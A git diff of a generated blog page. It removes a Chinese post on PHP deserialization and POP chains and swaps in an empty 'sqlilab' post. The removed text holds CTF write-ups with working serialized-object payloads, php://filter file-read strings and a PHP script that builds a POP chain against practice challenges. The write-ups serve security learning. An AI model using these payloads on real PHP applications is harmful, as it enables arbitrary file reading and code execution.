@@ -4,10 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="反序列化, Ethe&#39;s blog">
-    <meta name="description" content="基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数
-serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法
-">
+    <meta name="keywords" content="sqlilab, Ethe&#39;s blog">
+    <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +17,7 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>反序列化 | Ethe&#39;s blog</title>
+    <title>sqlilab | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -323,12 +321,12 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">反序列化</h1>
+                    <h1 class="description center-align post-title">sqlilab</h1>
                 </div>
             </div>
         </div>
@@ -456,17 +454,9 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
-                                <span class="chip bg-color">web学习</span>
-                            </a>
-                        
-                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                                <span class="chip bg-color">反序列化</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -478,28 +468,28 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-30
+                    2022-03-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-28
+                    2022-03-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.7k
+                    0
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    1 分
                 </div>
                 
 
@@ -522,288 +512,7 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>php的序列化和反序列化主要是通过serialize和unserialize两个函数</p>
-<p>serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法</p>
- <span id="more"></span>
-
-<p>几个常见的魔术方法</p>
-<pre class="language-none"><code class="language-none">__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。
-__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。
-__toString：当对象被当做一个字符串使用时调用。
-__sleep:序列化对象之前就调用此方法(其返回需要一个数组)
-__wakeup:反序列化恢复对象之前调用该方法
-__call:当调用对象中不存在的方法会自动调用该方法。
-__get:在调用私有属性的时候会自动执行
-__isset()在不可访问的属性上调用isset()或empty()触发
-__invoke()	当尝试把对象当方法调用时调用。
-__unset()在不可访问的属性上使用unset()时触发</code></pre>
-
-<p>格式</p>
-<pre class="language-none"><code class="language-none">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125;
-类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125;</code></pre>
-
-<p>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
-<p>private类型有隐藏的空格符</p>
-<p><strong>反序列化的常见起点</strong></p>
-<p>__wakeup 一定会调用</p>
-<p>__destruct 一定会调用</p>
-<p>__toString 当一个对象被反序列化后又被当做字符串使用</p>
-<p><strong>反序列化的常见中间跳板:</strong></p>
-<p>__toString 当一个对象被当做字符串使用<br>__get 读取不可访问或不存在属性时被调用<br>__set 当给不可访问或不存在属性赋值时被调用<br>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func();</p>
-<p><strong>反序列化的常见终点:</strong></p>
-<p>__call 调用不可访问或不存在的方法时被调用<br>call_user_func 一般php代码执行都会选择这里<br>call_user_func_array 一般php代码执行都会选择这里</p>
-<h3 id="POP链简介"><a href="#POP链简介" class="headerlink" title="POP链简介"></a><strong>POP链简介</strong></h3><p>借鉴的文章：</p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/16c56bebc63d">php反序列化利用——POP链构造实例 - 简书 (jianshu.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/105265462">(1条消息) PHP反序列化—构造POP链_Lemon&#39;s blog-CSDN博客_php反序列化pop链</a></p>
-<p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p>
-<h3 id="POP链利用技巧"><a href="#POP链利用技巧" class="headerlink" title="POP链利用技巧"></a>POP链利用技巧</h3><p>1、一些有用的POP链中出现的方法：</p>
-<pre class="language-php" data-language="php"><code class="language-php">- 命令执行：exec()、passthru()、popen()、system()
-- 文件操作：file_put_contents()、file_get_contents()、unlink()</code></pre>
-
-<p>2、<strong>反序列化中为了避免信息丢失，使用大写S支持字符串的编码。</strong>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这 个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即：</p>
-<pre class="language-css" data-language="css"><code class="language-css"><span class="token property">s</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span> -> <span class="token property">S</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"use\72"</span><span class="token punctuation">;</span></code></pre>
-
-<p>3、深浅copy：在 php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。<br> 4、配合PHP伪协议实现文件包含、命令执行等漏洞。</p>
-<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>先贴俩之前写的简单的</p>
-<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501204543745.png" alt="image-20210501204543745"></p>
-<p>看见file_get_contents(),利用伪协议data://text/plain;base64绕过</p>
-<p>再利用php://filter读取useless内的内容</p>
-<p>解码后</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501183046395.png" alt="image-20210501183046395"></p>
-<p>可知flag在flag.php中</p>
-<p>试图让file=flag.php</p>
-<p>看到unserialize函数，利用php反序列化</p>
-<p>构造payload</p>
-<p>？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205224647.png" alt="image-20210501205224647"></p>
-<p>查看源码找到flag</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205239104.png" alt="image-20210501205239104"></p>
-<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>页面中提示有备份文件，御剑扫一遍</p>
-<p>找到存在<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220739803.png" alt="image-20210501220739803"></p>
-<p>重点在class.php和index.php中</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220822144.png" alt="image-20210501220309908"></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220857753.png" alt="image-20210501220857753"></p>
-<p>所以要传入一个select参数，利用反序列化让username=admin</p>
-<p>password=100</p>
-<p>因为username和password两个为private类型</p>
-<p>所以有隐藏的空格符</p>
-<p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220212731.png" alt="image-20210501220212731"></p>
-<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>题目源码</p>
-<pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;
-    protected  $var;
-    public function append($value)&#123;
-        include($value);
-    &#125;
-    public function __invoke()&#123;
-        $this-&gt;append($this-&gt;var);
-    &#125;
-&#125;
-
-class Show&#123;
-    public $source;
-    public $str;
-    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;
-        $this-&gt;source &#x3D; $file;
-        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
-    &#125;
-    public function __toString()&#123;
-        return $this-&gt;str-&gt;source;
-    &#125;
-
-    public function __wakeup()&#123;
-        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;
-            echo &quot;hacker&quot;;
-            $this-&gt;source &#x3D; &quot;index.php&quot;;
-        &#125;
-    &#125;
-&#125;
-
-class Test&#123;
-    public $p;
-    public function __construct()&#123;
-        $this-&gt;p &#x3D; array();
-    &#125;
-
-    public function __get($key)&#123;
-        $function &#x3D; $this-&gt;p;
-        return $function();
-    &#125;
-&#125;
-
-if(isset($_GET[&#39;pop&#39;]))&#123;
-    @unserialize($_GET[&#39;pop&#39;]);
-&#125;
-else&#123;
-    $a&#x3D;new Show;
-    highlight_file(__FILE__);
-&#125;</code></pre>
-
-<p>题目里出现的魔术变量</p>
-<pre class="language-none"><code class="language-none">__construct   当一个对象创建时被调用，
-__toString   当一个对象被当作一个字符串被调用。
-__wakeup()   使用unserialize时触发
-__get()    用于从不可访问的属性读取数据
-#难以访问包括：（1）私有属性，（2）没有初始化的属性
-__invoke()   当脚本尝试将对象调用为函数时触发</code></pre>
-
-<p>这里可以看出来首先要get进一个pop值，并进行反序列化，所以就会调用__wakeup()这个方法_</p>
-<p>__<em>wakeup()中里利用preg_match对传入的值进行过滤，但如果this-&gt;source是show类，就会调用</em>__toString</p>
-<p>这里会返回$this-&gt;str-&gt;source，但如果没有source这个属性，接下来就会调用__get()，然后会将对象调用为函数，</p>
-<p><em>这里也就会触发</em>__invoke()，进而调用append</p>
-<p>在append的中存在include，所以可以利用文件包含漏洞读到flag</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003613462.png" alt="image-20210704003613462"></p>
-<p>payload</p>
-<p>（自己写一个还是有点困难</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-
-class Modifier
-&#123;
-    protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;
-
-&#125;
-
-class Show
-&#123;
-    public $source;
-    public $str;
-
-    public function __construct($file)
-    &#123;
-        $this-&gt;source &#x3D; $file;
-    &#125;
-
-&#125;
-
-class Test
-&#123;
-    public $p;
-&#125;
-
-$a &#x3D; new Show(&#39;aaa&#39;);
-$a-&gt;str &#x3D; new Test();
-$a-&gt;str-&gt;p &#x3D; new Modifier();
-$b &#x3D; new Show($a);
-echo urlencode(serialize($b));</code></pre>
-
-<p>base64解码拿到flag</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003713873.png" alt="image-20210704003713873"></p>
-<h3 id="CODE-REVIEW"><a href="#CODE-REVIEW" class="headerlink" title="CODE REVIEW"></a>CODE REVIEW</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705135850186.png" alt="image-20210705135850186"></p>
-<p>代码审计可以看出这里首先要先get进pleaseget=1然后post进pleasepost，md51，md52和obj四个值，而obj这里存在反序列化的漏洞</p>
-<p>且当if($this-&gt;correct === $this-&gt;input)成立时就会打印出flag</p>
-<p>这里同时要求传入的md51和md52的md5值相等，且自身不相等，由于md5不能处理数组，所以传入数组的返回值都为null</p>
-<p>而因为$this-&gt;correct这里进行了编码，所以要使if语句成立在构造payload时可以采用引用赋值的方法</p>
-<p>构造payload</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141338826.png" alt="image-20210705141338826"></p>
-<p>//uniqid() :函数基于以微秒计的当前时间，生成一个唯一的 ID。</p>
-<p>//传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。</p>
-<p>//引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。</p>
-<p>所以最终payload为</p>
-<p>get内容为：?pleaseget=1</p>
-<p>post内容为：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</p>
-<p>拿到flag</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141616910.png" alt="image-20210705141616910"></p>
-<h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><p>源码</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-
-include(&quot;flag.php&quot;);
-
-highlight_file(__FILE__);
-
-class FileHandler &#123;
-
-    protected $op;
-    protected $filename;
-    protected $content;
-
-    function __construct() &#123;
-        $op &#x3D; &quot;1&quot;;
-        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;
-        $content &#x3D; &quot;Hello World!&quot;;
-        $this-&gt;process();
-    &#125;
-
-    public function process() &#123;
-        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;
-            $this-&gt;write();
-        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;
-            $res &#x3D; $this-&gt;read();
-            $this-&gt;output($res);
-        &#125; else &#123;
-            $this-&gt;output(&quot;Bad Hacker!&quot;);
-        &#125;
-    &#125;
-
-    private function write() &#123;
-        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
-            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
-                $this-&gt;output(&quot;Too long!&quot;);
-                die();
-            &#125;
-            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);
-            if($res) $this-&gt;output(&quot;Successful!&quot;);
-            else $this-&gt;output(&quot;Failed!&quot;);
-        &#125; else &#123;
-            $this-&gt;output(&quot;Failed!&quot;);
-        &#125;
-    &#125;
-
-    private function read() &#123;
-        $res &#x3D; &quot;&quot;;
-        if(isset($this-&gt;filename)) &#123;
-            $res &#x3D; file_get_contents($this-&gt;filename);
-        &#125;
-        return $res;
-    &#125;
-
-    private function output($s) &#123;
-        echo &quot;[Result]: &lt;br&gt;&quot;;
-        echo $s;
-    &#125;
-
-    function __destruct() &#123;
-        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)
-            $this-&gt;op &#x3D; &quot;1&quot;;
-        $this-&gt;content &#x3D; &quot;&quot;;
-        $this-&gt;process();
-    &#125;
-
-&#125;
-
-function is_valid($s) &#123;
-    for($i &#x3D; 0; $i &lt; strlen($s); $i++)
-        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))
-            return false;
-    return true;
-&#125;
-
-if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
-
-    $str &#x3D; (string)$_GET[&#39;str&#39;];
-    if(is_valid($str)) &#123;
-        $obj &#x3D; unserialize($str);
-    &#125;
-
-&#125;</code></pre>
-
-<p>看到unserialize可以很容易想到反序列化，源码里还有file_get_contents，所以猜测这题是利用反序列化通过文件包含读取flag，利用php://filter来造成任意文件读取</p>
-<p>在传入后还存在一个is__valid()函数的过滤，要求传入内容的ascii码在32到123之内</p>
-<p>之后进行反序列化，由于要利用file_get_contents()读取flag，并将其打印出来，所以需要让op=2，执行read()中的内容</p>
-<p>构造payload</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150325057.png" alt="image-20210705150325057"></p>
-<p>这里因为protect进行反序列化时会出现特殊符号，导致无法通过is__valid函数的过滤，可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p>
-<pre class="language-php" data-language="php"><code class="language-php">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></pre>
-
-<p>（刚开始给op赋了个字符型的“2”，找错找了半天。。。</p>
-<p>拿到flag</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150240715.png" alt="image-20210705150240715"></p>
-<p>接下来base64解码就可以拿到flag了</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150647307.png" alt="image-20210705150647307"></p>
-<p>这周划水了（</p>
-<p>忙着学科目三了，周三考完试再补点（</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704004536648.png" alt="image-20210704004536648"></p>
-
+                
                 
             </div>
             <hr/>
@@ -829,7 +538,7 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://Ethe448.github.io/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                    <a href="https://Ethe448.github.io/2022/03/16/sqlilab/">https://Ethe448.github.io/2022/03/16/sqlilab/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -866,15 +575,7 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
-                                    <span class="chip bg-color">web学习</span>
-                                </a>
-                            
-                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                                    <span class="chip bg-color">反序列化</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1312,29 +1013,30 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/08/31/%E6%80%BB%E7%BB%93/">
+                <a href="/2022/03/16/sqlilab/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="总结">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="sqlilab">
                         
-                        <span class="card-title">总结</span>
+                        <span class="card-title">sqlilab</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            随便写点东西，写的挺乱的
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-31
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1343,14 +1045,7 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                        <span class="chip bg-color">随笔</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -1361,24 +1056,24 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+                <a href="/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="ssti模板注入">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="从一道ctf题看php原生类">
                         
-                        <span class="card-title">ssti模板注入</span>
+                        <span class="card-title">从一道ctf题看php原生类</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                             不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-25
                             </span>
                         <span class="publish-author">
                             
@@ -1391,12 +1086,8 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">web学习</span>
-                    </a>
-                    
-                    <a href="/tags/ssti%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">ssti注入</span>
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
